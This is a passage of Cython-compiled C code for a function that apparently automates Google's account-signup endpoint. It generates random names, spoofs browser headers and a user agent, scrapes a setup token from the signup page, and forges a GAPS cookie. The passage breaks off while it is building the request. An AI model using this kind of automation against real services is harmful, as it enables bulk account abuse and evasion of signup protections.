    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 405, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 405, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(__pyx_ptype_6source___pyx_scope_struct_2_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 406, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_8generator2, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 406, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 406, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__20, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 406, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 406, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 406, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 406, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 406, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



static PyObject *__pyx_pf_6source_10tll(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_n1 = NULL;
  PyObject *__pyx_v_n2 = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_he3 = NULL;
  PyObject *__pyx_v_res1 = NULL;
  PyObject *__pyx_v_tok = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_f = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_gb_6source_3tll_2generator = 0;
  PyObject *__pyx_gb_6source_3tll_5generator1 = 0;
  PyObject *__pyx_gb_6source_3tll_8generator2 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  Py_ssize_t __pyx_t_11;
  Py_UCS4 __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  int __pyx_t_18;
  int __pyx_t_19;
  int __pyx_t_20;
  char const *__pyx_t_21;
  PyObject *__pyx_t_22 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("tll", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __pyx_pf_6source_3tll_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 404, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 404, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__21, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 404, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_n1 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_pf_6source_3tll_3genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 405, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 405, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__21, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 405, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_n2 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_pf_6source_3tll_6genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 406, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 406, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__21, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 406, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_host = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 408, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u__22) < 0) __PYX_ERR(0, 408, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q) < 0) __PYX_ERR(0, 408, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 408, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 408, __pyx_L3_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ggb); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 412, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 412, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 412, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_t_6) < 0) __PYX_ERR(0, 408, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_he3 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 414, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 414, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 416, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_he3) < 0) __PYX_ERR(0, 416, __pyx_L3_error)

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__23, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 414, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_res1 = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 417, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_search); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 417, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_res1, __pyx_n_s_text); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 419, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = NULL;
      __pyx_t_9 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
          __pyx_t_9 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_6};
        __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_6};
        __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      } else
      #endif
      {
        __pyx_t_10 = PyTuple_New(2+__pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        if (__pyx_t_8) {
          __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_8); __pyx_t_8 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_data_initial_setup_data_null_nul);
        __Pyx_GIVEREF(__pyx_kp_u_data_initial_setup_data_null_nul);
        PyTuple_SET_ITEM(__pyx_t_10, 0+__pyx_t_9, __pyx_kp_u_data_initial_setup_data_null_nul);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_10, 1+__pyx_t_9, __pyx_t_6);
        __pyx_t_6 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 417, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_group); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 419, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_2);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 419, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_tok = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 421, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_Host_GAPS, __pyx_v_host) < 0) __PYX_ERR(0, 421, __pyx_L3_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 424, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_authority, __pyx_kp_u_accounts_google_com) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_accept, __pyx_kp_u__22) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_origin, __pyx_kp_u_https_accounts_google_com) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_referer, __pyx_kp_u_https_accounts_google_com_signup) < 0) __PYX_ERR(0, 424, __pyx_L3_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ggb); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 431, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 431, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_user_agent, __pyx_t_7) < 0) __PYX_ERR(0, 424, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_headers = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = PyTuple_New(11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_11 = 0;
      __pyx_t_12 = 127;
      __Pyx_INCREF(__pyx_kp_u__24);
      __pyx_t_11 += 2;
      __Pyx_GIVEREF(__pyx_kp_u__24);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u__24);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_tok, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
